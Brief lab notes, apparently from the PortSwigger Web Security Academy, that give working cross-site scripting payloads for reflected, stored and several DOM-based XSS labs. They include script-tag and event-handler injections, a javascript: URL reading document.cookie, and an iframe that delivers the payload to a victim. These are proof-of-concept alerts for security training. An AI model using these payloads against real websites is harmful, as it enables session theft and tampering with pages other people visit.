Ania Pirogowicz
# XSS

## Reflected XSS into HTML context with nothing encoded

```
?search=<script>alert(document.domain)</script>
```

## Stored XSS into HTML context with nothing encoded

In the leaving post commet functionality, the comment body is vulnerable:

```
<script>alert(document.domain)</script>Comment
```

## DOM XSS in document.write sink using source location.search

```
?search="+onload%3Dalert%28document.domain%29+x%3D"  // Without encoding: " onload=alert(document.domain) x="
```

## DOM XSS in innerHTML sink using source location.search

```
?search=<img+src%3D"X"+onerror%3Dalert%28document.domain%29>  // Without encoding: <img src="X" onerror=alert(document.domain)>
```

## DOM XSS in jQuery anchor href attribute sink using location.search source

```
/feedback?returnPath=javascript:alert(document.cookie)
```

## DOM XSS in jQuery selector sink using a hashchange event

On adding to URL this payload the XSS triggers via jQuery handler `$()`:
```
#<img src=X onerror=print()>
```

Deliver to victim:
```
<iframe src='https://0a0d00c00320c7a8868f0d22007000ee.web-security-academy.net/#' onload="this.src+='<img src=X onerror=print()>'"></iframe>
```